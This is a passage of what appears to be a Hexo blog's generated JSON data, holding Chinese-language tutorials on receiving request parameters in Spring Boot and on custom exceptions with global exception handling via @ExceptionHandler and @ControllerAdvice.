plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//请求url: http://127.0.0.1:8080/get3</span><br><span class=\"line\">//参数为json: &#123;&quot;param1&quot;:&quot;11&quot;,&quot;param2&quot;: &quot;22&quot;&#125;</span><br><span class=\"line\">@ResponseBody</span><br><span class=\"line\">@RequestMapping(value = &quot;/get3&quot;, method = RequestMethod.GET)</span><br><span class=\"line\">public String get3(@RequestBody Map&lt;String,String&gt; param)&#123;</span><br><span class=\"line\">    return param.get(&quot;param1&quot;) + param.get(&quot;param2&quot;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"4-HttpServletRequest\"><a href=\"#4-HttpServletRequest\" class=\"headerlink\" title=\"4.HttpServletRequest\"></a>4.HttpServletRequest</h6><p>get或post<br><br>适用于param=param(&amp;xx=xx)或者form-data<br><br>form-data会解析为param=param&amp;xx=xx形式<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//请求参数为: http://127.0.0.1:8080/get4?param1=11&amp;param2=22</span><br><span class=\"line\">//或参数为form-data</span><br><span class=\"line\">@ResponseBody</span><br><span class=\"line\">@RequestMapping(value = &quot;/get4&quot;, method = RequestMethod.GET)</span><br><span class=\"line\">public String get4(HttpServletRequest request) &#123;</span><br><span class=\"line\">    return request.getParameter(&quot;param1&quot;)+request.getParameter(&quot;param2&quot;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"5-直接获取\"><a href=\"#5-直接获取\" class=\"headerlink\" title=\"5.直接获取\"></a>5.直接获取</h6><p>get请求<br><br>适用于param=param(&amp;xx=xx)或者form-data<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@ResponseBody</span><br><span class=\"line\">@RequestMapping(value = &quot;/get5&quot;, method = RequestMethod.GET)</span><br><span class=\"line\">public String get4(String param1, String param2) &#123;</span><br><span class=\"line\">    return param1+param2;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>######</p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"一-原因\"><a href=\"#一-原因\" class=\"headerlink\" title=\"一.原因\"></a>一.原因</h4><p>一直对springboot前后端交互的传参接参浑浑噩噩，准备仔细梳理一下。</p>\n<h4 id=\"二-常见注解\"><a href=\"#二-常见注解\" class=\"headerlink\" title=\"二.常见注解\"></a>二.常见注解</h4><h6 id=\"1-PathVariable\"><a href=\"#1-PathVariable\" class=\"headerlink\" title=\"1.@PathVariable\"></a>1.@PathVariable</h6><p>用于Get请求<br><br>获取请求url中的值，一般用来接收url/{param}类型的参数<br><br>一般返回类型为json或页面跳转等<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//请求url: http://127.0.0.1:8080/get1/123</span><br><span class=\"line\">@ResponseBody</span><br><span class=\"line\">@RequestMapping(value = &quot;/get1/&#123;param&#125;&quot;,method = RequestMethod.GET)</span><br><span class=\"line\">public String  get1(@PathVariable(&quot;param&quot;) String param)&#123;</span><br><span class=\"line\">    System.out.println(param);</span><br><span class=\"line\">    return param;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"2-RequestParam\"><a href=\"#2-RequestParam\" class=\"headerlink\" title=\"2.@RequestParam\"></a>2.@RequestParam</h6><p>用于Get/Post都行<br><br>在get请求时  获取请求参数中的值<br><br>参数一般为url后面的param=param(&amp;xx=xx)或者form-data<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//请求url: http://127.0.0.1:8080/get2?param1=param1&amp;param2=param2</span><br><span class=\"line\">@ResponseBody</span><br><span class=\"line\">    @RequestMapping(value = &quot;/get2&quot;, method = RequestMethod.GET)</span><br><span class=\"line\">    public String get2(@RequestParam(&quot;param1&quot;) String param1,</span><br><span class=\"line\">                       @RequestParam(&quot;param2&quot;) String param2)&#123;</span><br><span class=\"line\">        return param1 + param2;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"3-RequestBody\"><a href=\"#3-RequestBody\" class=\"headerlink\" title=\"3.@RequestBody\"></a>3.@RequestBody</h6><p>用于Get/Post都行<br><br>该注解和@RequestParam殊途同归，我们使用该注解将所有参数转换，在代码部分在一个个取出来，也是目前我使用到最多的注解来获取参数<br><br>@RequestBody注解常用来处理content-type不是默认的application/x-www-form-urlcoded编码的内容，比如说：application/json或者是application/xml等。一般情况下来说常用其来处理application/json类型<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//请求url: http://127.0.0.1:8080/get3</span><br><span class=\"line\">//参数为json: &#123;&quot;param1&quot;:&quot;11&quot;,&quot;param2&quot;: &quot;22&quot;&#125;</span><br><span class=\"line\">@ResponseBody</span><br><span class=\"line\">@RequestMapping(value = &quot;/get3&quot;, method = RequestMethod.GET)</span><br><span class=\"line\">public String get3(@RequestBody Map&lt;String,String&gt; param)&#123;</span><br><span class=\"line\">    return param.get(&quot;param1&quot;) + param.get(&quot;param2&quot;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"4-HttpServletRequest\"><a href=\"#4-HttpServletRequest\" class=\"headerlink\" title=\"4.HttpServletRequest\"></a>4.HttpServletRequest</h6><p>get或post<br><br>适用于param=param(&amp;xx=xx)或者form-data<br><br>form-data会解析为param=param&amp;xx=xx形式<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//请求参数为: http://127.0.0.1:8080/get4?param1=11&amp;param2=22</span><br><span class=\"line\">//或参数为form-data</span><br><span class=\"line\">@ResponseBody</span><br><span class=\"line\">@RequestMapping(value = &quot;/get4&quot;, method = RequestMethod.GET)</span><br><span class=\"line\">public String get4(HttpServletRequest request) &#123;</span><br><span class=\"line\">    return request.getParameter(&quot;param1&quot;)+request.getParameter(&quot;param2&quot;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"5-直接获取\"><a href=\"#5-直接获取\" class=\"headerlink\" title=\"5.直接获取\"></a>5.直接获取</h6><p>get请求<br><br>适用于param=param(&amp;xx=xx)或者form-data<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@ResponseBody</span><br><span class=\"line\">@RequestMapping(value = &quot;/get5&quot;, method = RequestMethod.GET)</span><br><span class=\"line\">public String get4(String param1, String param2) &#123;</span><br><span class=\"line\">    return param1+param2;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>######</p>\n"},{"title":"spring利用异常来优化代码","date":"2019-08-01T14:52:55.000Z","_content":"\n# 一.异常\n\n盗图：https://marchnineteen.github.io/2018/08/08/java/javase/exception/\n![io](http://67.216.218.49:8000/file/blogs/java/base/exception/异常结构体系.png)\n\n异常的体系结构为：\n\n  - Throwable\n\n  所有异常的基类， 分为 Error 和 Exception\n\n  - Error\n\n  错误，一般会导致Jvm出错。\n\n  - Exception\n\n  分为 运行时异常(RuntimeException) 和 非运行时异常.<br>\n  也叫 未检查的异常  和  检查的异常\n\n\nJava compiler要求所有的Exception 要么被catch,要么被throw，除非这是一个RuntimeExeption (e instanceof RuntimeException)。也就是说，通常的Exception一定要被处理，也即我们所说的 checked exception，而RuntimeException不强制要求处理，（当然你自己要处理也可以），所以我们称为unchecked exception\n\n# 二.自定义异常\n\n## 1.例子\n\n```\n/**\n * 标记文件处理流程中得错误\n */\npublic class MyFileException extends RuntimeException {\n    private String errMsg;\n    private Throwable throwable;\n\n\n    public MyFileException() {\n        this(\"文件相关操作发生异常\");\n    }\n\n\n    public MyFileException(String errMsg) {\n        this.errMsg = errMsg;\n    }\n\n    public MyFileException(Throwable throwable) {\n        this.throwable = throwable;\n    }\n    public MyFileException(Throwable throwable, String msg) {\n        this.throwable = throwable;\n        this.errMsg = msg;\n    }\n\n    public String getErrMsg() {\n        if(this.errMsg == null || this.errMsg.equals(\"\")){\n            return this.throwable.getMessage();\n        }\n        if(this.throwable == null){\n            return this.errMsg;\n        }\n        return this.throwable.getMessage() + \" -- \" + this.errMsg;\n    }\n}\n```\n## 2.继承选择\n\n通常我们的自定义异常都继承于 Exception 或 RuntimeException.<br>\n\n两者的区别是:<br>\n\n 继承于 Exception 的  需要我们对异常进行处理，否则编译会不通过。利用这一点，可以强制的告诉别人，这里会发生一个异常，你必须注意到，并对它进行处理.<br>\n\n 继承于 RuntimeException 的， 为 unchecked Exception, 不要求强制处理(throw 时 不需要在方法上 throws)。实际上，这种类型的异常，通常应该交给上级(调用你的程序来进行处理).<br>\n\n\n选择使用那种方式，完全按照我们的需求与业务逻辑来.<br>\n\n# 三.Spring 全局异常\n\n## 1.@ExceptionHandler\n\n```\n@Target({ElementType.METHOD})\n@Retention(RetentionPolicy.RUNTIME)\n@Documented\npublic @interface ExceptionHandler {\n    Class<? extends Throwable>[] value() default {};\n}\n```\n\n作用域为 method<br>\n\n如果@ExceptionHandler方法是在 @Controller 内部定义的，那么它会接收并处理由 当前 Controller（或其任何子类）中的@RequestMapping方法抛出的异常。如果你将 @ExceptionHandler 方法定义在 @ControllerAdvice 类中，那么它会处理相关控制器中抛出的异常.<br>\n此外,@ExceptionHandler注解还可以接受一个异常类型的数组作为参数值。若抛出了已在列表中声明的异常，那么相应的@ExceptionHandler方法将会被调用。如果没有给注解任何参数值，那么默认处理的异常类型将是方法参数所声明的那些异常。\n\n## 2.@ControllerAdvice\n\n```\n@Target({ElementType.TYPE})\n@Retention(RetentionPolicy.RUNTIME)\n@Documented\n@Component\npublic @interface ControllerAdvice {\n    @AliasFor(\"basePackages\")\n    String[] value() default {};\n\n    @AliasFor(\"value\")\n    String[] basePackages() default {};\n\n    Class<?>[] basePackageClasses() default {};\n\n    Class<?>[] assignableTypes() default {};\n\n    Class<? extends Annotation>[] annotations() default {};\n}\n```\n作用域为 type,包括类、接口和枚举等<br>\n\n通过 @ControllerAdvice 注解可以将对于控制器(@Controller)的全局配置放在同一个位置<br>\n\n注意：  @ControllerAdvice 只能捕捉到Controller层(异常会向上传递，抛到调用层)抛出的异常\n\n## 3.全局异常\n\n由1，2已知，@ExceptionHandler 异常拦截只拦截当前 Controller 里的 @RequestMapping方法抛出的异常, 同时 @ControllerAdvice 可以提供对 Controller 的全局配置。 所以，将这两个注解结合，可以提供对 Controller 的全局异常拦截处理.<br>\n\n\n例子：\n```\n/**\n * 全局异常处理类，拦截@RequestMapping抛出的异常\n * 处理顺序为配置顺序 依次向下\n * @author xxl\n */\n@ControllerAdvice\nclass GlobalExceptionHandler {\n\n    /**\n     *  拦截BindException类的异常 @Valid注解触发\n     *  @NotBlank参数非空校验失败的异常\n     * @param e\n     * @return\n     */\n    @ExceptionHandler(BindException.class)\n    @ResponseBody\n    public ResultMessage exceptionHandler(BindException e){\n        e.printStackTrace();\n        return  ResultMessage.error(StatusCode.PARAMS_VALID_EXCEPTION,\"参数非空校验异常\");\n    }\n\n    /**\n     *  拦截MyDatabaseException类的异常\n     *  数据库操作异常\n     * @param e\n     * @return\n     */\n    @ExceptionHandler(MyDatabaseException.class)\n    @ResponseBody\n    public ResultMessage exceptionHandler(MyDatabaseException e){\n        e.printStackTrace();\n        return  ResultMessage.error(StatusCode.EXCEPTION_DATABASE,e.getErrMsg());\n    }\n\n    /**\n     *  拦截MyFileException类的异常\n     *  文件操作异常\n     * @param e\n     * @return\n     */\n    @ExceptionHandler(MyFileException.class)\n    @ResponseBody\n    public ResultMessage exceptionHandler(MyFileException e){\n        e.printStackTrace();\n        return  ResultMessage.error(StatusCode.EXCEPTION_DATABASE,e.getErrMsg());\n    }\n\n    /**\n     * 拦截MyParamsExxception\n     * 参数异常\n     * @param e\n     * @return\n     */\n    @ExceptionHandler(MyParamsException.class)\n    @ResponseBody\n    public ResultMessage exceptionHandler(MyParamsException e){\n        e.printStackTrace();\n        return  ResultMessage.error(StatusCode.EXCEPTION_DATABASE,e.getErrMsg());\n    }\n\n    /**\n     * 文件上传错误\n     * @param e\n     * @return\n     */\n    @ExceptionHandler(MultipartException.class)\n    @ResponseBody\n    public ResultMessage exceptionHandler(MultipartException e){\n        e.printStackTrace();\n        return  ResultMessage.error(StatusCode.SERVER_EXCEPTION,\"文件上传异常\");\n    }\n\n    /**\n     * 空指针异常拦截\n     * @param e\n     * @return\n     */\n    @ExceptionHandler(NullPointerException.class)\n    @ResponseBody\n    public ResultMessage exceptionHandler(NullPointerException e){\n        e.printStackTrace();\n        return ResultMessage.error(StatusCode.SERVER_EXCEPTION, \"空指针异常\");\n    }\n\n\n\n    /**\n     * 其它异常,最后拦截，所有没匹配到得异常\n     * @param e\n     * @return\n     */\n    @ExceptionHandler(Exception.class)\n    @ResponseBody\n    public ResultMessage exceptionHandler(Exception e){\n        e.printStackTrace();\n        return  ResultMessage.error(StatusCode.SERVER_EXCEPTION,\"发生异常--\" + e.getMessage());\n    }\n\n\n}\n```\n","source":"_posts/java/spring全局异常.md","raw":"---\ntitle: spring利用异常来优化代码\ndate: 2019-08-01 10:52:55\ntags: [java,spring]\n---\n\n# 一.异常\n\n盗图：https://marchnineteen.github.io/2018/08/08/java/javase/exception/\n![io](http://67.216.218.49:8000/file/blogs/java/base/exception/异常结构体系.png)\n\n异常的体系结构为：\n\n  - Throwable\n\n  所有异常的基类， 分为 Error 和 Exception\n\n  - Error\n\n  错误，一般会导致Jvm出错。\n\n  - Exception\n\n  分为 运行时异常(RuntimeException) 和 非运行时异常.<br>\n  也叫 未检查的异常  和  检查的异常\n\n\nJava compiler要求所有的Exception 要么被catch,要么被throw，除非这是一个RuntimeExeption (e instanceof RuntimeException)。也就是说，通常的Exception一定要被处理，也即我们所说的 checked exception，而RuntimeException不强制要求处理，（当然你自己要处理也可以），所以我们称为unchecked exception\n\n# 二.自定义异常\n\n## 1.例子\n\n```\n/**\n * 标记文件处理流程中得错误\n */\npublic class MyFileException extends RuntimeException {\n    private String errMsg;\n    private Throwable throwable;\n\n\n    public MyFileException() {\n        this(\"文件相关操作发生异常\");\n    }\n\n\n    public MyFileException(String errMsg) {\n        this.errMsg = errMsg;\n    }\n\n    public MyFileException(Throwable throwable) {\n        this.throwable = throwable;\n    }\n    public MyFileException(Throwable throwable, String msg) {\n        this.throwable = throwable;\n        this.errMsg = msg;\n    }\n\n    public String getErrMsg() {\n        if(this.errMsg == null || this.errMsg.equals(\"\")){\n            return this.throwable.getMessage();\n        }\n        if(this.throwable == null){\n            return this.errMsg;\n        }\n        return this.throwable.getMessage() + \" -- \" + this.errMsg;\n    }\n}\n```\n## 2.继承选择\n\n通常我们的自定义异常都继承于 Exception 或 RuntimeException.<br>\n\n两者的区别是:<br>\n\n 继承于 Exception 的  需要我们对异常进行处理，否则编译会不通过。利用这一点，可以强制的告诉别人，这里会发生一个异常，你必须注意到，并对它进行处理.<br>\n\n 继承于 RuntimeException 的， 为 unchecked Exception, 不要求强制处理(throw 时 不需要在方法上 throws)。实际上，这种类型的异常，通常应该交给上级(调用你的程序来进行处理).<br>\n\n\n选择使用那种方式，完全按照我们的需求与业务逻辑来.<br>\n\n# 三.Spring 全局异常\n\n## 1.@ExceptionHandler\n\n```\n@Target({ElementType.METHOD})\n@Retention(RetentionPolicy.RUNTIME)\n@Documented\npublic @interface ExceptionHandler {\n    Class<? extends Throwable>[] value() default {};\n}\n```\n\n作用域为 method<br>\n\n如果@ExceptionHandler方法是在 @Controller 内部定义的，那么它会接收并处理由 当前 Controller（或其任何子类）中的@RequestMapping方法抛出的异常。如果你将 @ExceptionHandler 方法定义在 @ControllerAdvice 类中，那么它会处理相关控制器中抛出的异常.<br>\n此外,@ExceptionHandler注解还可以接受一个异常类型的数组作为参数值。若抛出了已在列表中声明的异常，那么相应的@ExceptionHandler方法将会被调用。如果没有给注解任何参数值，那么默认处理的异常类型将是方法参数所声明的那些异常。\n\n## 2.@ControllerAdvice\n\n```\n@Target({ElementType.TYPE})\n@Retention(RetentionPolicy.RUNTIME)\n@Documented\n@Component\npublic @interface ControllerAdvice {\n    @AliasFor(\"basePackages\")\n    String[] value() default {};\n\n    @AliasFor(\"value\")\n    String[] basePackages() default {};\n\n    Class<?>[] basePackageClasses() default {};\n\n    Class<?>[] assignableTypes() default {};\n\n    Class<? extends Annotation>[] annotations() default {};\n}\n```\n作用域为 type,包括类、接口和枚举等<br>\n\n通过 @ControllerAdvice 注解可以将对于控制器(@Controller)的全局配置放在同一个位置<br>\n\n注意：  @ControllerAdvice 只能捕捉到Controller层(异常会向上传递，抛到调用层)抛出的异常\n\n## 3.全局异常\n\n由1，2已知，@ExceptionHandler 异常拦截只拦截当前 Controller 里的 @RequestMapping方法抛出的异常, 同时 @ControllerAdvice 可以提供对 Controller 的全局配置。 所以，将这两个注解结合，可以提供对 Controller 的全局异常拦截处理.<br>\n\n\n例子：\n```\n/**\n * 全局异常处理类，拦截@RequestMapping抛出的异常\n * 处理顺序为配置顺序 依次向下\n * @author xxl\n */\n@ControllerAdvice\nclass GlobalExceptionHandler {\n\n    /**\n     *  拦截BindException类的异常 @Valid注解触发\n     *  @NotBlank参数非空校验失败的异常\n     * @param e\n     * @return\n     */\n    @ExceptionHandler(BindException.class)\n    @ResponseBody\n    public ResultMessage exceptionHandler(BindException e){\n        e.printStackTrace();\n        return  ResultMessage.error(StatusCode.PARAMS_VALID_EXCEPTION,\"参数非空校验异常\");\n    }\n\n    /**\n     *  拦截MyDatabaseException类的异常\n     *  数据库操作异常\n     * @param e\n     * @return\n     */\n    @ExceptionHandler(MyDatabaseException.class)\n    @ResponseBody\n    public ResultMessage exceptionHandler(MyDatabaseException e){\n        e.printStackTrace();\n        return  ResultMessage.error(StatusCode.EXCEPTION_DATABASE,e.getErrMsg());\n    }\n\n    /**\n     *  拦截MyFileException类的异常\n     *  文件操作异常\n     * @param e\n     * @return\n     */\n    @ExceptionHandler(MyFileException.class)\n    @ResponseBody\n    public ResultMessage exceptionHandler(MyFileException e){\n        e.printStackTrace();\n        return  ResultMessage.error(StatusCode.EXCEPTION_DATABASE,e.getErrMsg());\n    }\n\n    /**\n     * 拦截MyParamsExxception\n     * 参数异常\n     * @param e\n     * @return\n     */\n    @ExceptionHandler(MyParamsException.class)\n    @ResponseBody\n    public ResultMessage exceptionHandler(MyParamsException e){\n        e.printStackTrace();\n        return  ResultMessage.error(StatusCode.EXCEPTION_DATABASE,e.getErrMsg());\n    }\n\n    /**\n     * 文件上传错误\n     * @param e\n     * @return\n     */\n    @ExceptionHandler(MultipartException.class)\n    @ResponseBody\n    public ResultMessage exceptionHandler(MultipartException e){\n        e.printStackTrace();\n        return  ResultMessage.error(StatusCode.SERVER_EXCEPTION,\"文件上传异常\");\n    }\n\n    /**\n     * 空指针异常拦截\n     * @param e\n     * @return\n     */\n    @ExceptionHandler(NullPointerException.class)\n    @ResponseBody\n    public ResultMessage exceptionHandler(NullPointerException e){\n        e.printStackTrace();\n        return ResultMessage.error(StatusCode.SERVER_EXCEPTION, \"空指针异常\");\n    }\n\n\n\n    /**\n     * 其它异常,最后拦截，所有没匹配到得异常\n     * @param e\n     * @return\n     */\n    @ExceptionHandler(Exception.class)\n    @ResponseBody\n    public ResultMessage exceptionHandler(Exception e){\n        e.printStackTrace();\n        return  ResultMessage.error(StatusCode.SERVER_EXCEPTION,\"发生异常--\" + e.getMessage());\n    }\n\n\n}\n```\n","slug":"java/spring全局异常","published":1,"updated":"2019-10-13T12:15:12.172Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321i8001m6dcpcwtu88cv","content":"<h1 id=\"一-异常\"><a href=\"#一-异常\" class=\"headerlink\" title=\"一.异常\"></a>一.异常</h1><p>盗图：<a href=\"https://marchnineteen.github.io/2018/08/08/java/javase/exception/\" target=\"_blank\" rel=\"noopener\">https://marchnineteen.github.io/2018/08/08/java/javase/exception/</a><br><img src=\"http://67.216.218.49:8000/file/blogs/java/base/exception/异常结构体系.png\" alt=\"io\"></p>\n<p>异常的体系结构为：</p>\n<ul>\n<li><p>Throwable</p>\n<p>所有异常的基类， 分为 Error 和 Exception</p>\n</li>\n<li><p>Error</p>\n<p>错误，一般会导致Jvm出错。</p>\n</li>\n<li><p>Exception</p>\n<p>分为 运行时异常(RuntimeException) 和 非运行时异常.<br><br>也叫 未检查的异常  和  检查的异常</p>\n</li>\n</ul>\n<p>Java compiler要求所有的Exception 要么被catch,要么被throw，除非这是一个RuntimeExeption (e instanceof RuntimeException)。也就是说，通常的Exception一定要被处理，也即我们所说的 checked exception，而RuntimeException不强制要求处理，（当然你自己要处理也可以），所以我们称为unchecked exception</p>\n<h1 id=\"二-自定义异常\"><a href=\"#二-自定义异常\" class=\"headerlink\" title=\"二.自定义异常\"></a>二.自定义异常</h1><h2 id=\"1-例子\"><a href=\"#1-例子\" class=\"headerlink\" title=\"1.例子\"></a>1.例子</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\"> * 标记文件处理流程中得错误</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class MyFileException extends RuntimeException &#123;</span><br><span class=\"line\">    private String errMsg;</span><br><span class=\"line\">    private Throwable throwable;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    public MyFileException() &#123;</span><br><span class=\"line\">        this(&quot;文件相关操作发生异常&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    public MyFileException(String errMsg) &#123;</span><br><span class=\"line\">        this.errMsg = errMsg;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public MyFileException(Throwable throwable) &#123;</span><br><span class=\"line\">        this.throwable = throwable;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    public MyFileException(Throwable throwable, String msg) &#123;</span><br><span class=\"line\">        this.throwable = throwable;</span><br><span class=\"line\">        this.errMsg = msg;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public String getErrMsg() &#123;</span><br><span class=\"line\">        if(this.errMsg == null || this.errMsg.equals(&quot;&quot;))&#123;</span><br><span class=\"line\">            return this.throwable.getMessage();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        if(this.throwable == null)&#123;</span><br><span class=\"line\">            return this.errMsg;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return this.throwable.getMessage() + &quot; -- &quot; + this.errMsg;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-继承选择\"><a href=\"#2-继承选择\" class=\"headerlink\" title=\"2.继承选择\"></a>2.继承选择</h2><p>通常我们的自定义异常都继承于 Exception 或 RuntimeException.<br></p>\n<p>两者的区别是:<br></p>\n<p> 继承于 Exception 的  需要我们对异常进行处理，否则编译会不通过。利用这一点，可以强制的告诉别人，这里会发生一个异常，你必须注意到，并对它进行处理.<br></p>\n<p> 继承于 RuntimeException 的， 为 unchecked Exception, 不要求强制处理(throw 时 不需要在方法上 throws)。实际上，这种类型的异常，通常应该交给上级(调用你的程序来进行处理).<br></p>\n<p>选择使用那种方式，完全按照我们的需求与业务逻辑来.<br></p>\n<h1 id=\"三-Spring-全局异常\"><a href=\"#三-Spring-全局异常\" class=\"headerlink\" title=\"三.Spring 全局异常\"></a>三.Spring 全局异常</h1><h2 id=\"1-ExceptionHandler\"><a href=\"#1-ExceptionHandler\" class=\"headerlink\" title=\"1.@ExceptionHandler\"></a>1.@ExceptionHandler</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Target(&#123;ElementType.METHOD&#125;)</span><br><span class=\"line\">@Retention(RetentionPolicy.RUNTIME)</span><br><span class=\"line\">@Documented</span><br><span class=\"line\">public @interface ExceptionHandler &#123;</span><br><span class=\"line\">    Class&lt;? extends Throwable&gt;[] value() default &#123;&#125;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>作用域为 method<br></p>\n<p>如果@ExceptionHandler方法是在 @Controller 内部定义的，那么它会接收并处理由 当前 Controller（或其任何子类）中的@RequestMapping方法抛出的异常。如果你将 @ExceptionHandler 方法定义在 @ControllerAdvice 类中，那么它会处理相关控制器中抛出的异常.<br><br>此外,@ExceptionHandler注解还可以接受一个异常类型的数组作为参数值。若抛出了已在列表中声明的异常，那么相应的@ExceptionHandler方法将会被调用。如果没有给注解任何参数值，那么默认处理的异常类型将是方法参数所声明的那些异常。</p>\n<h2 id=\"2-ControllerAdvice\"><a href=\"#2-ControllerAdvice\" class=\"headerlink\" title=\"2.@ControllerAdvice\"></a>2.@ControllerAdvice</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Target(&#123;ElementType.TYPE&#125;)</span><br><span class=\"line\">@Retention(RetentionPolicy.RUNTIME)</span><br><span class=\"line\">@Documented</span><br><span class=\"line\">@Component</span><br><span class=\"line\">public @interface ControllerAdvice &#123;</span><br><span class=\"line\">    @AliasFor(&quot;basePackages&quot;)</span><br><span class=\"line\">    String[] value() default &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    @AliasFor(&quot;value&quot;)</span><br><span class=\"line\">    String[] basePackages() default &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    Class&lt;?&gt;[] basePackageClasses() default &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    Class&lt;?&gt;[] assignableTypes() default &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    Class&lt;? extends Annotation&gt;[] annotations() default &#123;&#125;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>作用域为 type,包括类、接口和枚举等<br></p>\n<p>通过 @ControllerAdvice 注解可以将对于控制器(@Controller)的全局配置放在同一个位置<br></p>\n<p>注意：  @ControllerAdvice 只能捕捉到Controller层(异常会向上传递，抛到调用层)抛出的异常</p>\n<h2 id=\"3-全局异常\"><a href=\"#3-全局异常\" class=\"headerlink\" title=\"3.全局异常\"></a>3.全局异常</h2><p>由1，2已知，@ExceptionHandler 异常拦截只拦截当前 Controller 里的 @RequestMapping方法抛出的异常, 同时 @ControllerAdvice 可以提供对 Controller 的全局配置。 所以，将这两个注解结合，可以提供对 Controller 